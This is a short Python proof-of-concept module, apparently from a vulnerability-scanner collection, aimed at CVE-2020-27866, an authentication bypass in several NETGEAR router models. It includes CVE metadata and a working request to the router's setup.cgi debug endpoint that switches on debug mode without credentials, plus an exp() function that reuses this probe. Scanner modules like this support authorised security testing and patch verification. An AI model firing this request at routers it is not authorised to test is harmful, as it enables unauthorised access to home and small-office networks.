import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''NETGEAR Authentication Bypass vulnerability''',
        "description": '''This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Authentication is not required to exploit this vulnerability.''',
        "severity": "high",
        "references": [
            "https://wzt.ac.cn/2021/01/13/AC2400_vuln/", 
            "https://www.zerodayinitiative.com/advisories/ZDI-20-1451/", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27866", 
            "https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-27866",
            "cwe-id": "CWE-288"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "netgear", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/setup.cgi?todo=debug&x=currentsetting.htm"""
        method = "GET"
        data = """"""
        headers = {'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Accept-Language': 'en', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""Debug Enable!""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url